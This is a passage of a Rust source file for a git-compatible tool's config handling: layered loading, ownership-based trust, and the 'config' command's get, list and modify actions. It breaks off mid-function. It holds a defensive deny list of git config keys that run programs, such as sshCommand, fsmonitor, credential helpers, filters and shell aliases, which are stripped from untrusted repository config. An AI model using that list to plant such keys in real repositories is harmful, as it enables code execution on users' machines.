//! Git config (SPEC §9.4, §11.1): the layered [`ConfigSnapshot`] every command reads, and
//! `asc config` with git's flags over `gix-config`.

use std::ffi::OsString;
use std::path::{Path, PathBuf};
use std::process::ExitCode;

use bstr::{BStr, BString};
use gix_config::file::{Metadata, includes, init};
use gix_config::path::interpolate;
use gix_config::{File, Source};
use gix_sec::Trust;

use super::common::{CliError, Ctx, Result};
use super::safe_dir::{OwnerProbe, SafeDirectory, owned_by_current_user};
use crate::env::{ConfigParam, GitEnv, parse_git_bool};
use crate::msg::Msg;
use crate::native::NativeSpec;

/// The repository a snapshot is loaded for.
pub struct LocalConfig<'a> {
    /// `<common>/config` lives here.
    pub common_dir: &'a Path,
    /// The workspace root, for `includeIf "gitdir:"` (evaluated against `<root>/.git`).
    pub toplevel: &'a Path,
}

/// The merged config of one invocation: system, global, the workspace's common `config`, then
/// `GIT_CONFIG_PARAMETERS`/`GIT_CONFIG_COUNT` and `-c`.
pub struct ConfigSnapshot {
    file: File,
    home: Option<PathBuf>,
}

fn meta(source: Source, path: &Path, trust: Trust) -> Metadata {
    Metadata {
        path: Some(path.to_owned()),
        source,
        level: 0,
        trust,
    }
}

/// Keys whose values name a program or redirect where asc reads or writes, or a directory that
/// receives writes. A config file the current user does not own (`Trust::Reduced`) may not set
/// them: git ignores such keys from untrusted repo config for the same reason.
fn runs_programs_or_redirects(section: &str, sub: Option<&str>, name: &str, values: &[String]) -> bool {
    let section = section.to_ascii_lowercase();
    let name = name.to_ascii_lowercase();
    match section.as_str() {
        // The real git binary, the home and the cache and store locations.
        "asc" => {
            matches!(name.as_str(), "realgit" | "home")
                || sub.is_some_and(|s| {
                    ["cache", "store", "state"].iter().any(|d| s.eq_ignore_ascii_case(d))
                })
        }
        "core" => matches!(
            name.as_str(),
            "pager" | "editor" | "fsmonitor" | "sshcommand" | "askpass" | "hookspath" | "gitproxy"
                | "alternaterefscommand"
        ),
        "pager" | "credential" | "browser" | "man" | "trailer" => true,
        "sequence" => name == "editor",
        "gpg" => name == "program",
        "ssh" => name == "variant" || name == "program",
        "diff" => matches!(name.as_str(), "external" | "textconv" | "command"),
        "merge" => matches!(name.as_str(), "driver" | "tool"),
        "mergetool" | "difftool" => name == "cmd" || name == "path",
        "filter" => matches!(name.as_str(), "clean" | "smudge" | "process"),
        "remote" => matches!(name.as_str(), "receivepack" | "uploadpack" | "vcs" | "proxy"),
        "uploadpack" | "receive" => name.contains("hook"),
        "web" => name == "browser",
        // `alias.x = !shell` runs a shell; a plain alias only rewrites git's own argv.
        "alias" => values.iter().any(|v| v.trim_start().starts_with('!')),
        _ => false,
    }
}

/// Removes from every `Trust::Reduced` section the keys of [`runs_programs_or_redirects`].
fn restrict_reduced_trust(file: &mut File) {
    let ids: Vec<_> = file
        .sections_and_ids()
        .filter(|(s, _)| s.meta().trust != Trust::Full)
        .map(|(s, id)| (id, s.header().name().to_string(), s.header().subsection_name().map(|b| b.to_string())))
        .collect();
    for (id, section, sub) in ids {
        let Some(mut sec) = file.section_mut_by_id(id) else {
            continue;
        };
        let mut names: Vec<String> = sec.value_names().collect();
        names.dedup();
        for name in names {
            let values: Vec<String> = sec.values(&name).iter().map(|v| v.to_string()).collect();
            if runs_programs_or_redirects(&section, sub.as_deref(), &name, &values) {
                while sec.remove(&name).is_some() {}
            }
        }
    }
}

/// The `safe.directory` values git honours: system, global and command-line config only,
/// never the repository's own (a repo must not vouch for itself).
pub fn safe_directories(
    env: &GitEnv,
    get: &dyn Fn(&str) -> Option<OsString>,
) -> Result<SafeDirectory> {
    let home = std::env::home_dir();
    let options = init::Options {
        includes: {
            let mut o = includes::Options::follow(
                interpolation(home.as_deref()),
                includes::conditional::Context::default(),
            );
            o.err_on_missing_config_path = false;
            o
        },
        ..Default::default()
    };
    let metas: Vec<Metadata> = global_files(get)
        .into_iter()
        .map(|(s, p)| meta(s, &p, Trust::Full))
        .collect();
    let mut file = File::from_paths_metadata(metas, options)
        .map_err(|e| CliError::Fatal(format!("bad config: {e}")))?
        .unwrap_or_else(|| File::new(Metadata::api()));
    let cli = render_params(env.config_overrides());
    if !cli.is_empty() {
        let layer = File::from_bytes_no_includes(
            cli.as_bytes(),
            Metadata::from(Source::Cli),
            init::Options::default(),
        )
        .map_err(|e| CliError::Fatal(format!("bad config in command line: {e}")))?;
        file.append(layer)
            .map_err(|e| CliError::Fatal(format!("bad config in command line: {e}")))?;
    }
    let values = file
        .strings("safe.directory")
        .unwrap_or_default()
        .iter()
        .map(|v| v.to_string())
        .collect::<Vec<_>>();
    Ok(SafeDirectory::new(values))
}

/// The system and global files git would read, lowest precedence first, each once.
fn global_files(env: &dyn Fn(&str) -> Option<OsString>) -> Vec<(Source, PathBuf)> {
    let mut var = |k: &str| env(k);
    let mut out: Vec<(Source, PathBuf)> = Vec::new();
    for source in [Source::GitInstallation, Source::System, Source::Git, Source::User] {
        let Some(path) = source.storage_location(&mut var) else {
            continue;
        };
        if path.is_file() && !out.iter().any(|(_, p)| *p == path) {
            out.push((source, path));
        }
    }
    out
}

fn interpolation(home: Option<&Path>) -> interpolate::Context<'_> {
    interpolate::Context {
        git_install_dir: None,
        home_dir: home,
        home_for_user: Some(interpolate::home_for_user),
    }
}

/// Renders `-c` style parameters as a config file the parser reads.
fn render_params<'a>(params: impl Iterator<Item = &'a ConfigParam>) -> String {
    let mut text = String::new();
    for p in params {
        let Ok(key) = parse_key(&p.key) else { continue };
        text.push_str(&format!("[{}", key.section));
        if let Some(sub) = &key.sub {
            text.push_str(&format!(" \"{}\"", escape(sub)));
        }
        text.push_str("]\n\t");
        text.push_str(&key.name);
        if let Some(v) = &p.value {
            text.push_str(&format!(" = \"{}\"", escape(v)));
        }
        text.push('\n');
    }
    text
}

fn escape(text: &str) -> String {
    text.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\t', "\\t")
}

impl ConfigSnapshot {
    /// An empty snapshot.
    pub fn empty() -> Self {
        Self {
            file: File::new(Metadata::api()),
            home: None,
        }
    }

    /// A snapshot of one config text (tests).
    #[cfg(test)]
    pub fn from_text(text: &str) -> Self {
        Self {
            file: File::try_from(text).expect("test config parses"),
            home: None,
        }
    }

    /// Loads the layers named above. `get` reads the environment (`GIT_CONFIG_GLOBAL` and
    /// friends); tests pass a map.
    pub fn load(
        env: &GitEnv,
        get: &dyn Fn(&str) -> Option<OsString>,
        local: Option<&LocalConfig<'_>>,
    ) -> Result<Self> {
        Self::load_with(env, get, local, &owned_by_current_user)
    }

    /// [`ConfigSnapshot::load`] with the ownership probe supplied. The repo-local file is read
    /// with `Trust::Reduced` unless the current user owns it, and a reduced file cannot set the
    /// keys of [`runs_programs_or_redirects`].
    pub fn load_with(
        env: &GitEnv,
        get: &dyn Fn(&str) -> Option<OsString>,
        local: Option<&LocalConfig<'_>>,
        owned: OwnerProbe<'_>,
    ) -> Result<Self> {
        let home = std::env::home_dir();
        let git_dir = local.map(|l| l.toplevel.join(".git"));
        let mut opts = includes::Options::follow(
            interpolation(home.as_deref()),
            includes::conditional::Context {
                git_dir: git_dir.as_deref(),
                branch_name: None,
            },
        );
        opts.err_on_missing_config_path = false;
        let options = init::Options {
            includes: opts,
            ..Default::default()
        };
        let mut metas: Vec<Metadata> = global_files(get)
            .into_iter()
            .map(|(s, p)| meta(s, &p, Trust::Full))
            .collect();
        if let Some(l) = local {
            let path = l.common_dir.join("config");
            if path.is_file() {
                let trust = if owned(&path).unwrap_or(false) { Trust::Full } else { Trust::Reduced };
                metas.push(meta(Source::Local, &path, trust));
            }
        }
        let mut file = File::from_paths_metadata(metas, options)
            .map_err(|e| CliError::Fatal(format!("bad config: {e}")))?
            .unwrap_or_else(|| File::new(Metadata::api()));
        restrict_reduced_trust(&mut file);
        let cli = render_params(env.config_overrides());
        if !cli.is_empty() {
            let layer = File::from_bytes_no_includes(
                cli.as_bytes(),
                Metadata::from(Source::Cli),
                init::Options::default(),
            )
            .map_err(|e| CliError::Fatal(format!("bad config in command line: {e}")))?;
            file.append(layer)
                .map_err(|e| CliError::Fatal(format!("bad config in command line: {e}")))?;
        }
        Ok(Self { file, home })
    }

    /// The last value of `key`.
    pub fn get(&self, key: &str) -> Option<String> {
        self.file.string(key).map(|v| v.to_string())
    }

    /// Every value of a multi-valued `key`, in order.
    pub fn get_all(&self, key: &str) -> Vec<String> {
        self.file
            .strings(key)
            .unwrap_or_default()
            .iter()
            .map(|v| v.to_string())
            .collect()
    }

    /// The last value as a git boolean; a key without `=` is true. `None` when unset or bad.
    pub fn bool(&self, key: &str) -> Option<bool> {
        match self.file.boolean(key) {
            Ok(v) => v,
            Err(_) => self.get(key).and_then(|v| parse_git_bool(&v)),
        }
    }

    /// The last value as a path, `~/` expanded.
    pub fn path(&self, key: &str) -> Option<PathBuf> {
        let value = self.file.path(key)?;
        value.interpolate(interpolation(self.home.as_deref())).ok()
    }

    /// The underlying file.
    pub fn file(&self) -> &File {
        &self.file
    }
}

/// A normalised key: lowercase section and name, subsection as written.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Key {
    pub section: String,
    pub sub: Option<String>,
    pub name: String,
}

impl Key {
    /// The subsection as the config API takes it.
    fn sub_bstr(&self) -> Option<&BStr> {
        self.sub.as_deref().map(<&BStr>::from)
    }

    /// `section[.sub].name`, as `git config -l` prints it.
    pub fn display(&self) -> String {
        match &self.sub {
            Some(s) => format!("{}.{s}.{}", self.section, self.name),
            None => format!("{}.{}", self.section, self.name),
        }
    }
}

/// Parses and validates `section.name` / `section.sub.name` with git's rules.
pub fn parse_key(text: &str) -> std::result::Result<Key, Msg> {
    let Some(last) = text.rfind('.') else {
        return Err(Msg::ConfigNoSection { key: text.to_owned() });
    };
    if last + 1 == text.len() {
        return Err(Msg::ConfigNoVariable { key: text.to_owned() });
    }
    let invalid = || Msg::ConfigInvalidKey { key: text.to_owned() };
    let first = text.find('.').unwrap_or(last);
    let (section, name) = (&text[..first], &text[last + 1..]);
    let sub = (first < last).then(|| text[first + 1..last].to_owned());
    let section_ok = !section.is_empty()
        && section.chars().all(|c| c.is_ascii_alphanumeric() || c == '-');
    let name_ok = name.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-');
    let sub_ok = sub.as_deref().is_none_or(|s| !s.contains('\n'));
    if !(section_ok && name_ok && sub_ok) {
        return Err(invalid());
    }
    Ok(Key {
        section: section.to_ascii_lowercase(),
        sub,
        name: name.to_ascii_lowercase(),
    })
}

/// One entry of a listing.
#[derive(Clone, Debug, PartialEq, Eq)]
struct Entry {
    key: Key,
    value: Option<String>,
    origin: String,
    scope: &'static str,
}

fn scope_of(source: Source) -> &'static str {
    match source {
        Source::GitInstallation | Source::System => "system",
        Source::Git | Source::User => "global",
        Source::Local => "local",
        Source::Worktree => "worktree",
        _ => "command",
    }
}

/// Every key=value of `file` in file order.
fn entries(file: &File) -> Vec<Entry> {
    let mut out = Vec::new();
    for section in file.sections() {
        let header = section.header();
        let (section_name, sub) = (
            header.name().to_string().to_ascii_lowercase(),
            header.subsection_name().map(|s| s.to_string()),
        );
        let m = section.meta();
        let origin = match (&m.path, m.source) {
            (Some(p), _) => format!("file:{}", p.display().to_string().replace('\\', "/")),
            (None, _) => "command line:".to_owned(),
        };
        let body = section.body();
        let mut seen: std::collections::HashMap<String, usize> = Default::default();
        for name in body.value_names() {
            let lower = name.to_ascii_lowercase();
            let idx = seen.entry(lower.clone()).or_insert(0);
            let values = body.values(&name);
            let value = values.get(*idx).map(|v| v.to_string());
            *idx += 1;
            out.push(Entry {
                key: Key {
                    section: section_name.clone(),
                    sub: sub.clone(),
                    name: lower,
                },
                value,
                origin: origin.clone(),
                scope: scope_of(m.source),
            });
        }
    }
    out
}

/// `--type` conversions.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum ValueType {
    Bool,
    Int,
    BoolOrInt,
    Path,
}

fn parse_int(text: &str) -> Option<i64> {
    let t = text.trim();
    let (digits, mult) = match t.chars().last()?.to_ascii_lowercase() {
        'k' => (&t[..t.len() - 1], 1024),
        'm' => (&t[..t.len() - 1], 1024 * 1024),
        'g' => (&t[..t.len() - 1], 1024 * 1024 * 1024),
        _ => (t, 1),
    };
    digits.parse::<i64>().ok()?.checked_mul(mult)
}

fn convert(ty: Option<ValueType>, key: &Key, value: Option<&str>, home: Option<&Path>) -> Result<String> {
    let Some(ty) = ty else {
        return Ok(value.unwrap_or_default().to_owned());
    };
    let bad = |what: &str| {
        CliError::Fatal(format!(
            "bad {what} config value '{}' for '{}'",
            value.unwrap_or_default(),
            key.display()
        ))
    };
    let as_bool = || match value {
        None => Some(true),
        Some(v) => parse_git_bool(v),
    };
    match ty {
        ValueType::Bool => as_bool().map(|b| b.to_string()).ok_or_else(|| bad("boolean")),
        ValueType::Int => value
            .and_then(parse_int)
            .map(|n| n.to_string())
            .ok_or_else(|| bad("numeric")),
        ValueType::BoolOrInt => match value.and_then(parse_int) {
            Some(n) => Ok(n.to_string()),
            None => as_bool().map(|b| b.to_string()).ok_or_else(|| bad("numeric")),
        },
        ValueType::Path => {
            let v = value.unwrap_or_default();
            Ok(match (v.strip_prefix("~/"), home) {
                (Some(rest), Some(h)) => h.join(rest).display().to_string().replace('\\', "/"),
                _ => v.to_owned(),
            })
        }
    }
}

/// Which file(s) an invocation reads or writes.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Scope {
    Default,
    System,
    Global,
    Local,
    Worktree,
    File(PathBuf),
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Action {
    Get,
    GetAll,
    GetRegexp,
    Set,
    Add,
    ReplaceAll,
    Unset,
    UnsetAll,
    RenameSection,
    RemoveSection,
    List,
}

#[derive(Debug)]
struct Opts {
    scope: Scope,
    action: Option<Action>,
    ty: Option<ValueType>,
    null: bool,
    name_only: bool,
    show_origin: bool,
    show_scope: bool,
    default: Option<String>,
    all: bool,
    regexp: bool,
    append: bool,
    value_pattern: Option<String>,
    positional: Vec<String>,
}

/// Why argument parsing stopped.
enum ParseStop {
    Usage(String),
}

fn parse_opts(rest: &[OsString]) -> std::result::Result<Opts, ParseStop> {
    let mut o = Opts {
        scope: Scope::Default,
        action: None,
        ty: None,
        null: false,
        name_only: false,
        show_origin: false,
        show_scope: false,
        default: None,
        all: false,
        regexp: false,
        append: false,
        value_pattern: None,
        positional: Vec::new(),
    };
    let mut args = rest.iter().map(|a| a.to_string_lossy().into_owned());
    let mut ended = false;
    while let Some(arg) = args.next() {
        if ended || !arg.starts_with('-') || arg == "-" {
            o.positional.push(arg);
            continue;
        }
        let (name, inline) = match arg.split_once('=') {
            Some((n, v)) if arg.starts_with("--") => (n.to_owned(), Some(v.to_owned())),
            _ => (arg.clone(), None),
        };
        let value = |args: &mut dyn Iterator<Item = String>| -> std::result::Result<String, ParseStop> {
            inline
                .clone()
                .or_else(|| args.next())
                .ok_or_else(|| ParseStop::Usage(format!("option `{}' requires a value", name.trim_start_matches('-'))))
        };
        let set_action = |o: &mut Opts, a: Action| -> std::result::Result<(), ParseStop> {
            if o.action.is_some_and(|prev| prev != a) {
                return Err(ParseStop::Usage("only one action at a time".into()));
            }
            o.action = Some(a);
            Ok(())
        };
        match name.as_str() {
            "--" => ended = true,
            "--global" => o.scope = Scope::Global,
            "--system" => o.scope = Scope::System,
            "--local" => o.scope = Scope::Local,
            "--worktree" => o.scope = Scope::Worktree,
            "-f" | "--file" => o.scope = Scope::File(PathBuf::from(value(&mut args)?)),
            "--get" => set_action(&mut o, Action::Get)?,
            "--get-all" => set_action(&mut o, Action::GetAll)?,
            "--get-regexp" => set_action(&mut o, Action::GetRegexp)?,
            "--add" => set_action(&mut o, Action::Add)?,
            "--replace-all" => set_action(&mut o, Action::ReplaceAll)?,
            "--unset" => set_action(&mut o, Action::Unset)?,
            "--unset-all" => set_action(&mut o, Action::UnsetAll)?,
            "--rename-section" => set_action(&mut o, Action::RenameSection)?,
            "--remove-section" => set_action(&mut o, Action::RemoveSection)?,
            "-l" | "--list" => set_action(&mut o, Action::List)?,
            "--bool" => o.ty = Some(ValueType::Bool),
            "--int" => o.ty = Some(ValueType::Int),
            "--bool-or-int" => o.ty = Some(ValueType::BoolOrInt),
            "--path" => o.ty = Some(ValueType::Path),
            "--no-type" => o.ty = None,
            "-t" | "--type" => {
                o.ty = Some(match value(&mut args)?.as_str() {
                    "bool" => ValueType::Bool,
                    "int" => ValueType::Int,
                    "bool-or-int" => ValueType::BoolOrInt,
                    "path" => ValueType::Path,
                    other => return Err(ParseStop::Usage(format!("unrecognized --type argument, {other}"))),
                });
            }
            "-z" | "--null" => o.null = true,
            "--name-only" => o.name_only = true,
            "--show-origin" => o.show_origin = true,
            "--show-scope" => o.show_scope = true,
            "--default" => o.default = Some(value(&mut args)?),
            "--all" => o.all = true,
            "--regexp" => o.regexp = true,
            "--append" => o.append = true,
            "--value" => o.value_pattern = Some(value(&mut args)?),
            "--includes" | "--no-includes" => {}
            other => return Err(ParseStop::Usage(format!("unknown option `{}'", other.trim_start_matches('-')))),
        }
    }
    Ok(o)
}

/// `asc config` stub-free arguments: everything after the command word.
#[derive(clap::Parser, Debug)]
#[command(name = "config", disable_help_flag = true, disable_version_flag = true)]
pub struct Args {
    #[arg(trailing_var_arg = true, allow_hyphen_values = true, num_args = 0..)]
    pub rest: Vec<OsString>,
}

/// The legacy flags and the `list|get|set|unset` forms git 2.55 accepts.
pub const NATIVE: &[NativeSpec] = &[NativeSpec {
    cmd: "config",
    flags: &[
        "--global", "--system", "--local", "--worktree", "-f", "--file", "--get", "--get-all",
        "--get-regexp", "--add", "--replace-all", "--unset", "--unset-all", "--rename-section",
        "--remove-section", "-l", "--list", "--bool", "--int", "--bool-or-int", "--path", "-t",
        "--type", "--no-type", "-z", "--null", "--name-only", "--show-origin", "--show-scope",
        "--default", "--includes", "--no-includes", "--all", "--regexp", "--append", "--value",
    ],
    placeholders: &[],
}];

fn usage_error(text: &str) -> CliError {
    CliError::Usage(format!("error: {text}"))
}

/// The config file for a write or a single-scope read.
fn scope_path(ctx: &Ctx, scope: &Scope, for_write: bool) -> Result<Option<PathBuf>> {
    let get = |k: &str| std::env::var_os(k);
    let mut var = |k: &str| get(k);
    Ok(match scope {
        Scope::Default => unreachable!("the default scope has no single file"),
        Scope::System => Source::System.storage_location(&mut var),
        Scope::Global => {
            let user = Source::User.storage_location(&mut var);
            let xdg = Source::Git.storage_location(&mut var);
            match (user, xdg) {
                (Some(u), _) if u.is_file() => Some(u),
                (_, Some(x)) if x.is_file() => Some(x),
                (Some(u), _) => Some(u),
                (None, x) => x,
            }
        }
        Scope::Local | Scope::Worktree => {
            let Some(ws) = ctx.ws_opt() else {
                return Err(CliError::Msg(Msg::NotInGitDir));
            };
            Some(ws.projection.common_dir().join("config"))
        }
        Scope::File(p) => {
            let abs = if p.is_absolute() { p.clone() } else { ctx.cwd.join(p) };
            if !for_write && !abs.is_file() {
                return Err(CliError::Msg(Msg::ConfigUnreadable {
                    path: p.display().to_string(),
                    reason: "No such file or directory".into(),
                }));
            }
            Some(abs)
        }
    })
}

fn read_file(path: &Path, source: Source, ctx: &Ctx) -> Result<File> {
    if !path.is_file() {
        return Ok(File::new(meta(source, path, Trust::Full)));
    }
    let home = std::env::home_dir();
    let git_dir = ctx.ws_opt().map(|w| w.projection.toplevel().join(".git"));
    let mut opts = includes::Options::follow(
        interpolation(home.as_deref()),
        includes::conditional::Context {
            git_dir: git_dir.as_deref(),
            branch_name: None,
        },
    );
    opts.err_on_missing_config_path = false;
    let options = init::Options {
        includes: opts,
        ..Default::default()
    };
    File::from_paths_metadata([meta(source, path, Trust::Full)], options)
        .map_err(|e| CliError::Fatal(format!("bad config file '{}': {e}", path.display())))
        .map(|f| f.unwrap_or_else(|| File::new(meta(source, path, Trust::Full))))
}

fn source_of(scope: &Scope) -> Source {
    match scope {
        Scope::System => Source::System,
        Scope::Global => Source::User,
        Scope::Worktree => Source::Worktree,
        Scope::Local => Source::Local,
        _ => Source::Api,
    }
}

/// The permission bits of an existing config file (Unix); `None` for a new file and on
/// platforms without modes.
#[cfg(unix)]
fn existing_mode(path: &Path) -> Option<u32> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path)
        .ok()
        .map(|m| m.permissions().mode() & 0o7777)
}

#[cfg(not(unix))]
fn existing_mode(_path: &Path) -> Option<u32> {
    None
}

/// Creates `<path>.lock` exclusively. With a `mode` it is created no wider than that (the umask
/// can only narrow it) and then set to exactly `mode`, as git's `fchmod` does.
#[cfg(unix)]
fn open_lock(lock: &Path, mode: Option<u32>) -> std::io::Result<std::fs::File> {
    use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
    let mut options = std::fs::OpenOptions::new();
    options.write(true).create_new(true);
    if let Some(m) = mode {
        options.mode(m);
    }
    let handle = options.open(lock)?;
    if let Some(m) = mode {
        handle.set_permissions(std::fs::Permissions::from_mode(m))?;
    }
    Ok(handle)
}

#[cfg(not(unix))]
fn open_lock(lock: &Path, _mode: Option<u32>) -> std::io::Result<std::fs::File> {
    std::fs::OpenOptions::new().write(true).create_new(true).open(lock)
}

/// Atomically replaces `path` with `file`'s text, through `<path>.lock`. Git writes LF
/// whatever the platform, so CRLF is kept only in a file that already used it.
fn write_file(path: &Path, file: &File) -> Result<()> {
    let had_crlf = std::fs::read(path).is_ok_and(|b| b.windows(2).any(|w| w == b"\r\n"));
    let mut text = file.to_bstring().to_vec();
    if !had_crlf {
        text.retain(|&b| b != b'\r');
    }
    let mut lock = path.as_os_str().to_owned();
    lock.push(".lock");
    let lock = PathBuf::from(lock);
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).map_err(CliError::Io)?;
    }
    // A rewrite keeps the file's mode (a `chmod 600` config holding credentials stays 600); a
    // new file gets `0o666 & !umask`.
    let mut handle = open_lock(&lock, existing_mode(path)).map_err(|_| {
        CliError::Fatal(format!("could not lock config file {}", path.display()))
    })?;
    let written = std::io::Write::write_all(&mut handle, &text)
        .and_then(|()| handle.sync_all())
        .and_then(|()| {
            drop(handle);
            std::fs::rename(&lock, path)
        });
    if let Err(e) = written {
        let _ = std::fs::remove_file(&lock);
        return Err(CliError::Io(e));
    }
    Ok(())
}

/// Matches a value against `--value`/`<value-pattern>`: a regex, `!` negates.
fn value_filter(pattern: Option<&str>) -> Result<impl Fn(&str) -> bool> {
    let (negate, text) = match pattern {
        Some(p) => match p.strip_prefix('!') {
            Some(rest) => (true, Some(rest)),
            None => (false, Some(p)),
        },
        None => (false, None),
    };
    let re = text
        .map(regex::Regex::new)
        .transpose()
        .map_err(|e| CliError::Fatal(format!("invalid pattern: {e}")))?;
    Ok(move |v: &str| re.as_ref().is_none_or(|r| r.is_match(v)) != negate)
}

/// Runs `asc config`.
pub async fn run(ctx: &Ctx, a: Args) -> Result<ExitCode> {
    let mut o = match parse_opts(&a.rest) {
        Ok(o) => o,
        Err(ParseStop::Usage(text)) => return Err(usage_error(&text)),
    };
    // The git 2.55 subcommands map onto the legacy actions.
    if o.action.is_none() {
        let sub = o.positional.first().map(String::as_str);
        let mapped = match sub {
            Some("list") => Some(Action::List),
            Some("get") => Some(if o.regexp {
                Action::GetRegexp
            } else if o.all {
                Action::GetAll
            } else {
                Action::Get
            }),
            Some("set") => Some(if o.append {
                Action::Add
            } else if o.all {
                Action::ReplaceAll
            } else {
                Action::Set
            }),
            Some("unset") => Some(if o.all { Action::UnsetAll } else { Action::Unset }),
            Some("rename-section") => Some(Action::RenameSection),
            Some("remove-section") => Some(Action::RemoveSection),
            _ => None,
        };
        if let Some(m) = mapped {
            o.positional.remove(0);
            o.action = Some(m);
        }
    }
    let action = match (o.action, o.positional.len()) {
        (Some(a), _) => a,
        (None, 1) => Action::Get,
        (None, 2 | 3) => Action::Set,
        (None, 0) => return Err(usage_error("no action specified")),
        (None, _) => return Err(usage_error("wrong number of arguments, should be from 1 to 3")),
    };
    match action {
        Action::List => list(ctx, &o),
        Action::Get | Action::GetAll | Action::GetRegexp => get(ctx, &o, action),
        _ => modify(ctx, &o, action),
    }
}

/// The values to read: the merged snapshot, or one scope's file.
fn read_scope(ctx: &Ctx, scope: &Scope) -> Result<File> {
    match scope {
        Scope::Default => Ok(ctx.config.file().clone()),
        other => {
            let path = scope_path(ctx, other, false)?;
            match path {
                Some(p) => read_file(&p, source_of(other), ctx),
                None => Ok(File::new(Metadata::api())),
            }
        }
    }
}

fn emit(o: &Opts, entry: &Entry, shown_key: bool, value: &str) -> String {
    let mut line = String::new();
    if o.show_scope {
        line.push_str(entry.scope);
        line.push('\t');
    }
    if o.show_origin {
        line.push_str(&entry.origin);
        line.push('\t');
    }
    if o.name_only {
        line.push_str(&entry.key.display());
    } else if shown_key && o.null {
        line.push_str(&entry.key.display());
        line.push('\n');
        line.push_str(value);
    } else if shown_key {
        line.push_str(&entry.key.display());
        line.push(if o.action == Some(Action::List) { '=' } else { ' ' });
        line.push_str(value);
    } else {
        line.push_str(value);
    }
    line.push(if o.null { '\0' } else { '\n' });
    line
}

fn list(ctx: &Ctx, o: &Opts) -> Result<ExitCode> {
    let file = read_scope(ctx, &o.scope)?;
    let home = std::env::home_dir();
    let mut out = String::new();
    for e in entries(&file) {
        let value = convert(o.ty, &e.key, e.value.as_deref(), home.as_deref())?;
        out.push_str(&emit(o, &e, true, &value));
    }
    print_out(&out)?;
    Ok(ExitCode::SUCCESS)
}

fn print_out(text: &str) -> Result<()> {
    use std::io::Write;
    let mut stdout = std::io::stdout().lock();
    stdout.write_all(text.as_bytes()).map_err(CliError::Io)?;
    stdout.flush().map_err(CliError::Io)
}

fn get(ctx: &Ctx, o: &Opts, action: Action) -> Result<ExitCode> {
    let file = read_scope(ctx, &o.scope)?;
    let home = std::env::home_dir();
    let all = entries(&file);
    let mut out = String::new();
    let mut hits = 0usize;
    if action == Action::GetRegexp {
        let [pattern, ..] = o.positional.as_slice() else {
            return Err(usage_error("wrong number of arguments, should be from 1 to 2"));
        };
        let re = regex::Regex::new(pattern)
            .map_err(|e| CliError::Fatal(format!("invalid key pattern: {pattern}: {e}")))?;
        let accept = value_filter(o.positional.get(1).map(String::as_str))?;
        for e in &all {
            let value = e.value.as_deref().unwrap_or_default();
            if re.is_match(&e.key.display()) && accept(value) {
                let v = convert(o.ty, &e.key, e.value.as_deref(), home.as_deref())?;
                out.push_str(&emit(o, e, true, &v));
                hits += 1;
            }
        }
    } else {
        let [name, ..] = o.positional.as_slice() else {
            return Err(usage_error("wrong number of arguments, should be from 1 to 2"));
        };
        let key = parse_key(name).map_err(CliError::Msg)?;
        let accept = value_filter(
            o.value_pattern
                .as_deref()
                .or(o.positional.get(1).map(String::as_str)),
        )?;
        let matching: Vec<&Entry> = all
            .iter()
            .filter(|e| {
                e.key == key
                    && accept(e.value.as_deref().unwrap_or_default())
            })
            .collect();
        let chosen: Vec<&&Entry> = if action == Action::GetAll {
            matching.iter().collect()
        } else {
            matching.last().into_iter().collect()
        };
        for e in chosen {
            let v = convert(o.ty, &e.key, e.value.as_deref(), home.as_deref())?;
            out.push_str(&emit(o, e, o.name_only, &v));
            hits += 1;
        }
        if hits == 0
            && let Some(default) = &o.default
        {
            let v = convert(o.ty, &key, Some(default), home.as_deref())?;
            out.push_str(&v);
            out.push(if o.null { '\0' } else { '\n' });
            hits = 1;
        }
    }
    print_out(&out)?;
    Ok(if hits == 0 { ExitCode::from(1) } else { ExitCode::SUCCESS })
}

fn modify(ctx: &Ctx, o: &Opts, action: Action) -> Result<ExitCode> {
    let scope = if o.scope == Scope::Default {
        Scope::Local
    } else {
        o.scope.clone()
    };
    let path = scope_path(ctx, &scope, true)?
        .ok_or_else(|| CliError::Fatal("no config file for this scope".into()))?;
    let mut file = read_file_no_includes(&path, source_of(&scope))?;
    let home = std::env::home_dir();
    let section_of = |text: &str| -> Result<(String, Option<String>)> {
        let (sec, sub) = match text.split_once('.') {
            Some((s, rest)) => (s.to_owned(), Some(rest.to_owned())),
            None => (text.to_owned(), None),
        };
        Ok((sec, sub))
    };
    match action {
        Action::RenameSection => {
            let [old, new] = o.positional.as_slice() else {
                return Err(usage_error("wrong number of arguments, should be 2"));
            };
            let (os, osub) = section_of(old)?;
            let (ns, nsub) = section_of(new)?;
            file.rename_section(
                os.as_str(),
                osub.as_deref().map(<&BStr>::from),
                ns,
                nsub.map(BString::from),
            )
                .map_err(|_| CliError::Msg(Msg::NoSuchSection { name: old.clone() }))?;
        }
        Action::RemoveSection => {
            let [name] = o.positional.as_slice() else {
                return Err(usage_error("wrong number of arguments, should be 1"));
            };
            let (sec, sub) = section_of(name)?;
            let mut removed = false;
            while file.remove_section(sec.as_str(), sub.as_deref().map(<&BStr>::from)).is_some() {
                removed = true;
            }
            if !removed {
                return Err(CliError::Msg(Msg::NoSuchSection { name: name.clone() }));
            }
        }
        Action::Unset | Action::UnsetAll => {
            let [name, ..] = o.positional.as_slice() else {
                return Err(usage_error("wrong number of arguments, should be from 1 to 2"));
            };
            let key = parse_key(name).map_err(CliError::Msg)?;
            let accept = value_filter(
                o.value_pattern
                    .as_deref()
                    .or(o.positional.get(1).map(String::as_str)),
            )?;
            let found = matching_indices(&file, &key, &accept);
            if found.is_empty() {
                return Ok(ExitCode::from(5));
            }
            if action == Action::Unset && found.len() > 1 {
                eprintln!("warning: {} has multiple values", key.display());
                return Ok(ExitCode::from(5));
            }
            let mut values = file
                .raw_values_mut_by(key.section.as_str(), key.sub_bstr(), key.name.as_str())
                .map_err(|e| CliError::Fatal(e.to_string()))?;
            for i in found.into_iter().rev() {
                values.delete(i);
            }
        }
        Action::Set | Action::Add | Action::ReplaceAll => {
            let [name, value, ..] = o.positional.as_slice() else {
